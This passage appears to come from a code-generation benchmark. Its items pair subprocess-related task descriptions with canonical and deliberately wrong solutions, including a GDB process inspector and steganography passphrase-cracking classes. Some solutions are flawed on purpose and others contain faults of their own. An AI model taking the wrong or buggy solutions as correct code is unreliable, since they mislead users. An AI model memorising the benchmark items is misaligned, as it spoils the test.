self.execute(self.fst_model, tmp_fname, is_file=True,\n                              nbest=self.nbest)\n        os.remove(tmp_fname)\n        return output\n\n    def translate(self, words):\n        if type(words) is str or len(words) == 1:\n            self._logger.debug('Converting single word to phonemes')\n            output = self._translate_word(words if type(words) is str\n                                          else words[0])\n        else:\n            self._logger.debug('Converting %d words to phonemes', len(words))\n            output = self._translate_words(words)\n        self._logger.debug('G2P conversion returned phonemes for %d words',\n                           len(output))\n        return output",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport logging\nimport tempfile\n\nclass PhonetisaurusG2P:\n    def __init__(self, fst_model=None, nbest=None):\n        self.fst_model = fst_model\n        self.nbest = nbest\n        self._logger = logging.getLogger(__name__)\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        command = ['phonetisaurus-g2p']\n        if is_file:\n            command.extend(['--input', input])\n        else:\n            command.extend(['--word', input])\n        if nbest is not None:\n            command.extend(['--nbest', str(nbest)])\n        command.append('--model')\n        command.append(fst_model)\n        \n        try:\n            result = subprocess.run(command, check=True, capture_output=True, text=True)\n            return self._parse_output(result.stdout)\n        except subprocess.CalledProcessError as e:\n            self._logger.error(f\"Error executing phonetisaurus-g2p: {e.stderr}\")\n            raise\n\n    def _parse_output(self, output):\n        results = {}\n        for line in output.splitlines():\n            parts = line.split('\\t')\n            if len(parts) == 3:\n                word, score, pronunciation = parts\n                if word not in results:\n                    results[word] = []\n                results[word].append((pronunciation, float(score)))\n        return results\n\n    def _translate_word(self, word):\n        return self.execute(self.fst_model, word, nbest=self.nbest)\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:\n            temp_file.write('\\n'.join(words))\n            temp_file.flush()\n            try:\n                return self.execute(self.fst_model, temp_file.name, is_file=True, nbest=self.nbest)\n            finally:\n                import os\n                os.remove(temp_file.name)\n\n    def translate(self, words):\n        if isinstance(words, str):\n            return self._translate_word(words)\n        elif isinstance(words, list):\n            return self._translate_words(words)\n        else:\n            raise ValueError(\"Input must be a string or a list of strings\")\n```"
  },
  {
    "Task_id": 287,
    "Instruction": "Task Description: Create a function that inspects the value of a Python object in a running process by its memory address using GDB debugger through subprocess communication.\n\nFunction Description: The function uses GDB to attach to a running Python process and inspect the value of a Python object at a specified memory address. It establishes inter-process communication using subprocess.PIPE to capture GDB's output and parse the result.\n\nInput:\n- pid: [int] - Process ID of the target Python process\n- address: [str/int] - Memory address of the Python object to inspect (can be hex string or integer)\n\nOutput:\n- [str] - The string representation of the inspected Python object as returned by GDB, or None if the address couldn't be resolved",
    "Canonical_solution": "import sys\nimport subprocess\n\nencoding = sys.getdefaultencoding()\n\ndef inspect(pid, address):\n    \"Return the value of an object in a given process at the specified address\"\n    cmd = ' '.join([\n        'gdb --quiet -p %s -batch' % pid,\n        '-eval-command=\"print (PyObject *)%s\"' % address,\n    ])\n    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n    for line in p.communicate()[0].decode(encoding).split('\\n'):\n        if line.startswith('$1 = '):\n            return line[5:]",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef inspect_python_object(pid, address):\n    # Convert address to hexadecimal if it's an integer\n    if isinstance(address, int):\n        address = hex(address)\n    \n    # GDB command to inspect the Python object\n    gdb_command = f\"p *({address})\"\n    \n    # Start GDB subprocess to attach to the Python process\n    process = subprocess.Popen(\n        [\"gdb\", \"-p\", str(pid)],\n        stdin=subprocess.PIPE,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True,\n        universal_newlines=True\n    )\n    \n    # Send the GDB command to inspect the object\n    process.stdin.write(f\"{gdb_command}\\n\")\n    process.stdin.write(\"quit\\n\")  # Quit GDB after command execution\n    process.stdin.flush()\n    \n    # Capture GDB's output\n    output, _ = process.communicate()\n    \n    # Check if the output contains the inspected object's value\n    if \"No symbol table is loaded.\" in output or \"Cannot access memory at address\" in output:\n        return None\n    \n    # Extract and return the value of the object from GDB's output\n    lines = output.splitlines()\n    for line in lines:\n        if line.startswith(\"$1 = \"):\n            return line[5:]\n    \n    return None"
  },
  {
    "Task_id": 288,
    "Instruction": "Task Description: Implement functions to execute system commands and manage subprocesses in Python, allowing for both simple command execution and more controlled process management with input/output handling.\n\nFunction Description: The module provides two main functions for subprocess management: `execute()` for running commands with comprehensive output handling, and `popen()` for creating Popen objects with predefined pipe configurations.\n\nInput:\n- For `execute()`:\n  - cmd: [string/list] - Command to execute (as string or argument list)\n  - shell: [bool, optional] - Whether to use shell execution (default False)\n  - poll_period: [float, optional] - Unused in current implementation\n  - catch_out: [bool, optional] - Whether to capture output (default False)\n  - executable: [string, optional] - Path to executable to use\n  - env: [dict, optional] - Environment variables for subprocess\n\n- For `popen()`:\n  - cmnd: [string] - Command string to execute\n\nOutput:\n- For `execute()`:\n  - Returns tuple: (returncode: int, stdout: bytes/str, stderr: bytes/str)\n  \n- For `popen()`:\n  - Returns: subprocess.Popen object configured with pipes for all streams",
    "Canonical_solution": "import subprocess\nimport shlex\nimport logging\nfrom six import string_types\n\ndef execute(cmd, shell=False, poll_period=1.0, catch_out=False, executable=None, env=None):\n    log = logging.getLogger(__name__)\n    log.info(\"Starting: %s\", cmd)\n\n    stdout = \"\"\n    stderr = \"\"\n\n    if not shell and isinstance(cmd, string_types):\n        cmd = shlex.split(cmd)\n    if not executable:\n        executable = None\n\n    if catch_out:\n        process = subprocess.Popen(\n            cmd,\n            shell=shell,\n            stderr=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            close_fds=True,\n            env=env,\n            executable=executable,\n        )\n    else:\n        process = subprocess.Popen(cmd, shell=shell, close_fds=True, env=env, executable=executable)\n\n    stdout, stderr = process.communicate()\n    if stderr:\n        log.error(\"There were errors:\\n%s\", stderr)\n\n    if stdout:\n        log.debug(\"Process output:\\n%s\", stdout)\n    returncode = process.returncode\n    log.info(\"Process cmd: %s \u2013 exit code: %s\", cmd, returncode)\n    return returncode, stdout, stderr\n\ndef popen(cmnd):\n    return subprocess.Popen(\n        cmnd,\n        bufsize=0,\n        close_fds=True,\n        shell=True,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        stdin=subprocess.PIPE,\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef execute(cmd, shell=False, poll_period=0.1, catch_out=False, executable=None, env=None):\n    if isinstance(cmd, str):\n        cmd = cmd.split()\n    process = subprocess.Popen(cmd, shell=shell, executable=executable, env=env,\n                               stdout=subprocess.PIPE if catch_out else None,\n                               stderr=subprocess.PIPE if catch_out else None)\n    stdout, stderr = process.communicate()\n    return process.returncode, stdout, stderr\n\ndef popen(cmnd):\n    return subprocess.Popen(cmnd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n```"
  },
  {
    "Task_id": 29,
    "Instruction": "Task Description: Implement a robust HTTP client class in Python that handles both HTTP and HTTPS connections, supports proxy configuration, and manages connection timeouts and keep-alive settings.\n\nClass Description: The MNSHttp class provides a wrapper around Python's http.client module to handle HTTP/HTTPS requests with additional features like proxy support, connection timeout management, and keep-alive functionality.\n\nAttributes:\n- host: str - The target server hostname or IP address\n- is_https: bool - Flag indicating whether to use HTTPS (True) or HTTP (False)\n- connection_timeout: int - Connection timeout in seconds (default: 60)\n- keep_alive: bool - Flag for maintaining persistent connections (default: True)\n- request_size: int - Tracks the size of the last request sent\n- response_size: int - Tracks the size of the last response received\n- logger: Logger - Optional logger for debugging information\n- proxy: str - Optional proxy server configuration\n- conn: HTTPConnection/HTTPSConnection - The active connection object\n\nMethods:\n- __init__(host, connection_timeout=60, keep_alive=True, logger=None, is_https=False) -> None - Initializes the HTTP client with connection parameters\n- _new_conn() -> HTTPConnection/HTTPSConnection - Creates a new connection object based on current configuration\n- _basic_auth_str(username, password) -> str - Generates Basic Auth header string\n- get_env_proxy() -> str - Retrieves proxy configuration from environment variables\n- set_connection_timeout(connection_timeout) -> None - Updates the connection timeout and recreates the connection if needed\n- send_request(req_inter) -> ResponseInternal - Sends an HTTP request and returns the response, handling proxy configuration and connection management\n\nHelper Classes:\n- MNSHTTPConnection(host, port=None, strict=None, connection_timeout=60) - Custom HTTP connection with timeout support and request size tracking\n- MNSHTTPSConnection(host, port=None) - Custom HTTPS connection with request size tracking\n\nBoth connection classes extend their respective http.client counterparts and add:\n- request_length tracking\n- Custom connect() implementation for MNSHTTPConnection with timeout support\n- Overridden send() method to track request size\n- Standardized request() method initialization",
    "Canonical_solution": "import base64\nimport socket\nfrom http.client import HTTPConnection, BadStatusLine, HTTPSConnection\nfrom urllib.parse import urlparse, unquote\nimport os\n\nclass MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger\n        self.proxy = None\n        self.conn = self._new_conn()\n        if self.logger:\n            self.logger.info(\"InitMNSHttp KeepAlive:%s ConnectionTime:%s\" % (self.keep_alive, self.connection_timeout))\n\n    def _new_conn(self):\n        if self.is_https:\n            return MNSHTTPSConnection(self.host)\n        else:\n            return MNSHTTPConnection(self.host, connection_timeout=self.connection_timeout)\n\n    def _basic_auth_str(self, username, password):\n        if isinstance(username, str):\n            username = username.encode()\n        if isinstance(password, str):\n            password = password.encode()\n        return 'Basic ' + base64.b64encode(b':'.join((username, password))).strip().decode()\n\n    def get_env_proxy(self):\n        if self.is_https:\n            return os.getenv('https_proxy') or os.getenv('HTTPS_PROXY')\n        else:\n            return os.getenv('http_proxy') or os.getenv('HTTP_PROXY')\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        if not self.is_https:\n            if self.conn:\n                self.conn.close()\n            self.conn = MNSHTTPConnection(self.host, connection_timeout=connection_timeout)\n\n    def send_request(self, req_inter):\n        try:\n            if self.logger:\n                self.logger.debug(\"SendRequest %s\" % req_inter)\n\n            proxy = self.get_env_proxy()\n            if proxy:\n                url = urlparse(proxy)\n                self.conn.close()\n                if url.username:\n                    req_inter.header['Proxy-Authorization'] = self._basic_auth_str(unquote(url.username), unquote(url.password))\n                if self.is_https:\n                    self.conn = MNSHTTPSConnection(url.hostname, url.port)\n                else:\n                    self.conn = MNSHTTPConnection(url.hostname, url.port, connection_timeout=self.connection_timeout)\n                self.conn.set_tunnel(self.host, headers=req_inter.header)\n            else:\n                if self.conn.host != self.host:\n                    self.conn.close()\n                    self.conn = self._new_conn()\n\n            self.conn.request(req_inter.method, 'http://%s%s' % (self.host, req_inter.uri), req_inter.data, req_inter.header)\n            self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n            try:\n                http_resp = self.conn.getresponse()\n            except BadStatusLine:\n                self.conn.close()\n                self.conn.request(req_inter.method, req_inter.uri, req_inter.data, req_inter.header)\n                self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n                http_resp = self.conn.getresponse()\n            \n            headers = dict(http_resp.getheaders())\n            resp_inter = ResponseInternal(status=http_resp.status, header=headers, data=http_resp.read())\n            self.request_size = self.conn.request_length\n            self.response_size = len(resp_inter.data)\n            \n            if not self.is_keep_alive():\n                self.conn.close()\n            if self.logger:\n                self.logger.debug(\"GetResponse %s\" % resp_inter)\n            return resp_inter\n        except Exception as e:\n            self.conn.close()\n            raise MNSClientNetworkException(\"NetWorkException\", str(e), req_inter.get_req_id())\n\nclass MNSHTTPConnection(HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        HTTPConnection.__init__(self, host, port, strict)\n        self.request_length = 0\n        self.connection_timeout = connection_timeout\n\n    def send(self, str):\n        HTTPConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPConnection.request(self, method, url, body, headers)\n\n    def connect(self):\n        msg = \"getaddrinfo returns an empty list\"\n        for res in socket.getaddrinfo(self.host, self.port, 0, socket.SOCK_STREAM):\n            af, socktype, proto, canonname, sa = res\n            try:\n                self.sock = socket.socket(af, socktype, proto)\n                self.sock.settimeout(self.connection_timeout)\n                self.sock.connect(sa)\n            except socket.error as msg:\n                if self.sock:\n                    self.sock.close()\n                self.sock = None\n                continue\n            break\n        if not self.sock:\n            raise socket.error(msg)\n\nclass MNSHTTPSConnection(HTTPSConnection):\n    def __init__(self, host, port=None):\n        HTTPSConnection.__init__(self, host, port)\n        self.request_length = 0\n\n    def send(self, str):\n        HTTPSConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPSConnection.request(self, method, url, body, headers)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport logging\nimport os\nfrom http.client import HTTPConnection, HTTPSConnection\nfrom urllib.parse import urlparse\n\nclass MNSHTTPConnection(HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        super().__init__(host, port, strict)\n        self.connection_timeout = connection_timeout\n        self.request_length = 0\n\n    def connect(self):\n        self.sock.settimeout(self.connection_timeout)\n        super().connect()\n\n    def send(self, data):\n        self.request_length += len(data)\n        super().send(data)\n\nclass MNSHTTPSConnection(HTTPSConnection):\n    def __init__(self, host, port=None):\n        super().__init__(host, port)\n        self.request_length = 0\n\n    def send(self, data):\n        self.request_length += len(data)\n        super().send(data)\n\nclass MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger\n        self.proxy = self.get_env_proxy()\n        self.conn = self._new_conn()\n\n    def _new_conn(self):\n        if self.is_https:\n            return MNSHTTPSConnection(self.host)\n        else:\n            return MNSHTTPConnection(self.host, connection_timeout=self.connection_timeout)\n\n    def _basic_auth_str(self, username, password):\n        return f\"Basic {base64.b64encode(f'{username}:{password}'.encode()).decode()}\"\n\n    def get_env_proxy(self):\n        proxy_url = os.getenv('http_proxy') or os.getenv('https_proxy')\n        if proxy_url:\n            return urlparse(proxy_url)\n        return None\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        self.conn = self._new_conn()\n\n    def send_request(self, req_inter):\n        try:\n            if self.proxy:\n                self.conn.set_tunnel(self.host)\n            self.conn.request(*req_inter)\n            response = self.conn.getresponse()\n            self.response_size = len(response.read())\n            return response\n        except Exception as e:\n            if self.logger:\n                self.logger.error(f\"Request failed: {e}\")\n            raise\n\nclass ResponseInternal:\n    def __init__(self, status, reason, headers, body):\n        self.status = status\n        self.reason = reason\n        self.headers = headers\n        self.body = body\n\n    def __repr__(self):\n        return f\"Response(status={self.status}, reason={self.reason}, headers={self.headers}, body={self.body})\"\n```"
  },
  {
    "Task_id": 290,
    "Instruction": "Task Description: Implement a class that interfaces with the Phonetisaurus G2P (Grapheme-to-Phoneme) tool to convert words to their phonetic pronunciations using a pre-trained FST (Finite State Transducer) model.\n\nClass Description: The PhonetisaurusG2P class provides an interface to the Phonetisaurus G2P tool, allowing for the conversion of words or files containing words to their phonetic pronunciations. It handles process execution, error logging, and output parsing.\n\nAttributes:\n- fst_model: [str] - The file path to the pre-trained FST model used for grapheme-to-phoneme conversion.\n- nbest: [int/None] - The number of best pronunciations to return for each word. If None, only the top pronunciation is returned.\n- _logger: [logging.Logger] - A logger instance for debugging and error logging.\n\nMethods:\n- __init__(fst_model=None, nbest=None) -> [None] - Initializes the PhonetisaurusG2P instance with the path to the FST model and the number of best pronunciations to return.\n  - Input Parameters:\n    - fst_model: [str] - Path to the FST model file.\n    - nbest: [int/None] - Number of best pronunciations to return (default: None).\n  - Return Type: None\n\n- execute(input, is_file=False) -> [dict] - Executes the Phonetisaurus G2P tool to convert the input word or file to phonetic pronunciations.\n  - Input Parameters:\n    - input: [str] - The input word or file path containing words to be converted.\n    - is_file: [bool] - Flag indicating whether the input is a file (default: False).\n  - Return Type: dict - A dictionary where keys are words and values are lists of pronunciations. Each pronunciation is a string.\n  - Description: This method uses subprocess.Popen to run the Phonetisaurus G2P tool, captures stdout and stderr, parses the output, and returns the results in a structured format. Errors are logged, and exceptions are raised for execution failures.",
    "Canonical_solution": "import os\nimport re\nimport subprocess\nimport logging\n\nclass PhonetisaurusG2P:\n    PATTERN = re.compile(r'^(?P<word>.+)\\t(?P<precision>\\d+\\.\\d+)\\t<s> ' +\n                         r'(?P<pronounciation>.*) </s>', re.MULTILINE)\n\n    def __init__(self, fst_model=None, nbest=None):\n        self._logger = logging.getLogger(__name__)\n        self.fst_model = os.path.abspath(fst_model)\n        self.nbest = nbest\n\n    def execute(self, input, is_file=False):\n        cmd = ['phonetisaurus-g2p',\n               '--model=%s' % self.fst_model,\n               '--input=%s' % input,\n               '--words']\n\n        if is_file:\n            cmd.append('--isfile')\n\n        if self.nbest is not None:\n            cmd.extend(['--nbest=%d' % self.nbest])\n\n        cmd = [str(x) for x in cmd]\n        try:\n            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            stdoutdata, stderrdata = proc.communicate()\n        except OSError:\n            self._logger.error(\"Error occured while executing command '%s'\",\n                             ' '.join(cmd), exc_info=True)\n            raise\n\n        if stderrdata:\n            for line in stderrdata.splitlines():\n                message = line.strip()\n                if message:\n                    self._logger.debug(message)\n\n        if proc.returncode != 0:\n            self._logger.error(\"Command '%s' return with exit status %d\",\n                             ' '.join(cmd), proc.returncode)\n            raise OSError(\"Command execution failed\")\n\n        result = {}\n        if stdoutdata is not None:\n            for word, precision, pronounc in self.PATTERN.findall(stdoutdata):\n                if word not in result:\n                    result[word] = []\n                result[word].append(pronounc)\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport logging\nimport os\n\nclass PhonetisaurusG2P:\n    def __init__(self, fst_model=None, nbest=None):\n        self.fst_model = fst_model\n        self.nbest = nbest\n        self._logger = logging.getLogger(__name__)\n\n    def execute(self, input, is_file=False):\n        if not self.fst_model or not os.path.exists(self.fst_model):\n            raise ValueError(\"FST model file is not set or does not exist.\")\n        \n        command = ['phonetisaurus-g2p', '--model', self.fst_model]\n        if self.nbest is not None:\n            command.extend(['--nbest', str(self.nbest)])\n        \n        if is_file:\n            if not os.path.isfile(input):\n                raise FileNotFoundError(f\"Input file {input} does not exist.\")\n            command.extend(['--wordlist', input])\n        else:\n            command.append(input)\n        \n        try:\n            result = subprocess.run(command, capture_output=True, text=True, check=True)\n        except subprocess.CalledProcessError as e:\n            self._logger.error(f\"Error executing Phonetisaurus G2P: {e.stderr}\")\n            raise RuntimeError(\"Failed to execute Phonetisaurus G2P tool.\") from e\n        \n        output = result.stdout.strip().split('\\n')\n        pronunciation_dict = {}\n        \n        for line in output:\n            parts = line.split('\\t')\n            if len(parts) < 2:\n                continue\n            word = parts[0]\n            pronunciation = parts[1]\n            if word not in pronunciation_dict:\n                pronunciation_dict[word] = []\n            pronunciation_dict[word].append(pronunciation)\n        \n        return pronunciation_dict\n```"
  },
  {
    "Task_id": 293,
    "Instruction": "Task Description: Implement a set of steganography cracking classes that utilize subprocess communication to interact with different steganography tools (steghide, outguess, outguess-0.13, and openstego) for extracting hidden data from files.\n\nClass Description: Each class implements a specific steganography tool cracker using subprocess communication to interact with the respective command-line tool. The classes follow a similar pattern of spawning a subprocess, communicating with it via pipes, and analyzing the output to determine if the correct passphrase was found.\n\nAttributes:\nNone (These are stateless classes that don't maintain instance attributes)\n\nMethods:\n\nMethod1: crack_function(stego_file: str, passphrase: str) -> None - Attempts to extract hidden data from the given stego_file using the provided passphrase. Prints success message and exits if found, otherwise continues silently.\n\nClasses:\n\n1. ThreadedSteghideCracker:\n   - Uses 'steghide' command-line tool\n   - Checks for embedded file information in output\n   - Prints extraction command on success\n\n2. ThreadedOutguessCracker:\n   - Uses 'outguess' command-line tool\n   - Creates temporary file for output\n   - Validates extracted data for ASCII content\n   - Prints secret message and cleanup command on success\n\n3. ThreadedOutguess013Cracker:\n   - Uses 'outguess-0.13' command-line tool\n   - Similar functionality to ThreadedOutguessCracker\n   - Handles older version of outguess\n\n4. ThreadedOpenstegoCracker:\n   - Uses 'openstego' command-line tool\n   - Checks stderr for extraction success\n   - Prints extracted file path on success\n\nAll methods:\n- Use subprocess.Popen with stdout/stderr pipes\n- Process communication via communicate()\n- Include proper error handling\n- Exit program on successful extraction\n- Include cleanup for temporary files where applicable",
    "Canonical_solution": "import subprocess\nimport re\nimport sys\nimport os\nimport md5\n\nclass ThreadedSteghideCracker:\n    def crack_function(self, stego_file, passphrase):\n        process = subprocess.Popen(['steghide',\n                                  'info',\n                                  stego_file,\n                                  '-p', passphrase],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        m = re.search(r\"embedded file \\\"(.*)\\\"\", out)\n        if m is not None:\n            print(\"\\nFound '{}'!\\n\\\nExtract with `steghide extract -sf {} -p \\\"{}\\\"`\"\n                  .format(m.group(1), stego_file, passphrase))\n            sys.exit(0)\n\nclass ThreadedOutguessCracker:\n    def crack_function(self, stego_file, passphrase):\n        tmp_file = \"/tmp/{}\".format(md5.new(passphrase).hexdigest())\n        process = subprocess.Popen(['outguess',\n                                  '-k', passphrase,\n                                  '-r', stego_file,\n                                  tmp_file],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        try:\n            with open(tmp_file, \"r\") as f:\n                data = f.read()\n                if len(data) > 0:\n                    ascii_data = \"\".join(filter(lambda x: ord(x) < 128, data))\n                    if float(len(ascii_data)) / float(len(data)) > 0.8:\n                        print(\"\\nFound secret message:\\n---\\n{}\\n---\\n\\\nExtract with `outguess -k \\\"{}\\\" -r {} /tmp/outguess_secret.txt`\"\n                              .format(ascii_data, passphrase, stego_file))\n                        sys.exit(0)\n        finally:\n            os.remove(tmp_file)\n\nclass ThreadedOutguess013Cracker:\n    def crack_function(self, stego_file, passphrase):\n        tmp_file = \"/tmp/{}\".format(md5.new(passphrase).hexdigest())\n        process = subprocess.Popen(['outguess-0.13',\n                                  '-k', passphrase,\n                                  '-r', stego_file,\n                                  tmp_file],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        try:\n            with open(tmp_file, \"r\") as f:\n                data = f.read()\n                if len(data) > 0:\n                    ascii_data = \"\".join(filter(lambda x: ord(x) < 128, data))\n                    if float(len(ascii_data)) / float(len(data)) > 0.8:\n                        print(\"\\nFound secret message:\\n---\\n{}\\n---\\n\\\nExtract with `outguess -k \\\"{}\\\" -r {} /tmp/outguess_secret.txt`\"\n                              .format(ascii_data, passphrase, stego_file))\n                        sys.exit(0)\n        finally:\n            os.remove(tmp_file)\n\nclass ThreadedOpenstegoCracker:\n    def crack_function(self, stego_file, passphrase):\n        process = subprocess.Popen(['openstego', 'extract',\n                                  '-p', passphrase,\n                                  '-sf', stego_file],\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n        (out, err) = process.communicate()\n        m = re.search(r\"Extracted file: (.*)\", err)\n        if m is not None:\n            print(\"\\nFound '{}'!\\n\\\nExtract with `openstego extract -sf {} -p \\\"{}\\\"`\"\n                  .format(m.group(1), stego_file, passphrase))\n            sys.exit(0)",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport os\nimport tempfile\n\nclass ThreadedSteghideCracker:\n    @staticmethod\n    def crack_function(stego_file: str, passphrase: str) -> None:\n        try:\n            result = subprocess.run(['steghide', 'extract', '-sf', stego_file, '-p', passphrase], capture_output=True, text=True)\n            if 'Embedded file' in result.stdout:\n                print(f\"Success: Hidden data extracted using steghide with passphrase '{passphrase}'.\")\n                print(f\"Command used: steghide extract -sf {stego_file} -p {passphrase}\")\n                exit(0)\n        except Exception as e:\n            pass\n\nclass ThreadedOutguessCracker:\n    @staticmethod\n    def crack_function(stego_file: str, passphrase: str) -> None:\n        try:\n            with tempfile.NamedTemporaryFile(delete=False) as temp_file:\n                temp_path = temp_file.name\n                result = subprocess.run(['outguess', '-r', stego_file, temp_path, '-k', passphrase], capture_output=True, text=True)\n                if os.path.exists(temp_path):\n                    with open(temp_path, 'rb') as f:\n                        data = f.read()\n                    if all(c.isprintable() or c.isspace() for c in data.decode()):\n                        print(f\"Success: Hidden data extracted using outguess with passphrase '{passphrase}'.\")\n                        print(f\"Secret message: {data.decode()}\")\n                        print(f\"Cleanup command: rm {temp_path}\")\n                        exit(0)\n        except Exception as e:\n            pass\n        finally:\n            if os.path.exists(temp_path):\n                os.remove(temp_path)\n\nclass ThreadedOutguess013Cracker:\n    @staticmethod\n    def crack_function(stego_file: str, passphrase: str) -> None:\n        try:\n            with tempfile.NamedTemporaryFile(delete=False) as temp_file:\n                temp_path = temp_file.name\n                result = subprocess.run(['outguess-0.13', '-r', stego_file, temp_path, '-k', passphrase], capture_output=True, text=True)\n                if os.path.exists(temp_path):\n                    with open(temp_path, 'rb') as f:\n                        data = f.read()\n                    if all(c.isprintable() or c.isspace() for c in data.decode()):\n                        print(f\"Success: Hidden data extracted using outguess-0.13 with passphrase '{passphrase}'.\")\n                        print(f\"Secret message: {data.decode()}\")\n                        print(f\"Cleanup command: rm {temp_path}\")\n                        exit(0)\n        except Exception as e:\n            pass\n        finally:\n            if os.path.exists(temp_path):\n                os.remove(temp_path)\n\nclass ThreadedOpenstegoCracker:\n    @staticmethod\n    def crack_function(stego_file: str, passphrase: str) -> None:\n        try:\n            result = subprocess.run(['openstego', 'extract', '-f', stego_file, '-p', passphrase], capture_output=True, text=True)\n            if 'Extracted file' in result.stderr:\n                print(f\"Success: Hidden data extracted using openstego with passphrase '{passphrase}'.\")\n                print(f\"Extracted file path: {result.stderr.split('Extracted file: ')[1].strip()}\")\n                exit(0)\n        except Exception as e:\n            pass\n```"
  },
  {
    "Task_id": 294,
    "Instruction": "Task Description: Implement a set of functions to interact with the Mercurial (hg) version control system to retrieve branch information and repository status using subprocess communication.\n\nFunction Description: The functions use Python's subprocess module to execute Mercurial commands and capture their output through pipes. The functions handle process creation, communication, and output parsing to provide repository information.\n\nInput: None (functions retrieve information directly from the Mercurial repository in the current working directory)\n\nOutput:\n\n_get_hg_branch() -> str - Returns the current Mercurial branch name as a string\n_get_hg_status(output: tuple) -> list - Returns a list of status lines from Mercurial output\nbuild_stats() -> tuple - Returns a tuple containing (status_list, branch_name) or (None, None) if an error occurs",
    "Canonical_solution": "import subprocess\nfrom ..utils import get_subprocess_env\n\ndef _get_hg_branch():\n    p = subprocess.Popen([\"hg\", \"branch\"],\n                         stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE,\n                         env=get_subprocess_env())\n    branch = p.communicate()[0].decode(\"utf-8\").rstrip('\\n')\n    return branch\n\ndef _get_hg_status(output):\n    return output[0].decode(\"utf-8\").splitlines()\n\ndef build_stats():\n    try:\n        p = subprocess.Popen([\"hg\", \"status\"],\n                             stdout=subprocess.PIPE,\n                             stderr=subprocess.PIPE,\n                             env=get_subprocess_env())\n    except OSError:\n        return None, None\n    pdata = p.communicate()\n    if p.returncode != 0:\n        return None, None\n    status = _get_hg_status(pdata)\n    branch = _get_hg_branch()\n    return status, branch",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef _get_hg_branch():\n    try:\n        result = subprocess.run(['hg', 'branch'], capture_output=True, text=True, check=True)\n        return result.stdout.strip()\n    except subprocess.CalledProcessError:\n        return None\n\ndef _get_hg_status(output):\n    if output and output[0] == 0:\n        return output[1].splitlines()\n    return None\n\ndef build_stats():\n    try:\n        # Get the branch name\n        branch = _get_hg_branch()\n        \n        # Get the status of the repository\n        status_result = subprocess.run(['hg', 'status'], capture_output=True, text=True, check=True)\n        status_lines = status_result.stdout.splitlines()\n        \n        return (status_lines, branch)\n    except subprocess.CalledProcessError:\n        return (None, None)\n```"
  },
  {
    "Task_id": 297,
    "Instruction": "Task Description: Create a function that executes a system command in a subprocess, captures its output and error streams, and handles potential errors appropriately.\n\nFunction Description: The function `run_cmd` executes a given system command as a subprocess, with options for verbose output. It captures both stdout and stderr streams, provides real-time output when in verbose mode, and raises an exception if the command fails (non-zero return code). The function ensures proper process cleanup and returns the command's output and error streams.\n\nInput:\n- command: List[str] - A list of strings representing the command and its arguments to be executed\n- verbose: bool (optional, default=False) - If True, prints real-time output of the command execution\n\nOutput:\n- Returns: Tuple[bytes, bytes] - A tuple containing the stdout and stderr output from the command\n- Raises: Exception - If the command returns a non-zero exit code, includes the return code and output streams in the exception message",
    "Canonical_solution": "import subprocess\nimport sys\n\ndef run_cmd(command, verbose=False):\n    if verbose:\n        print(\"Running command:\", \" \".join(command))\n    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n    if verbose:\n        while proc.poll() is None:\n            string = b\"\"\n            for c in iter(lambda: proc.stdout.read(1), string):\n                c = c.decode(\"ascii\")\n                sys.stdout.write(c)\n\n        sys.stdout.flush()\n\n    proc.wait()\n    if proc.returncode != 0:\n        out, err = proc.communicate()\n        raise Exception(\n            \"The training could not be completed (returncode=%i): %s %s\"\n            % (proc.returncode, out, err)\n        )\n\n    out, err = proc.communicate()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
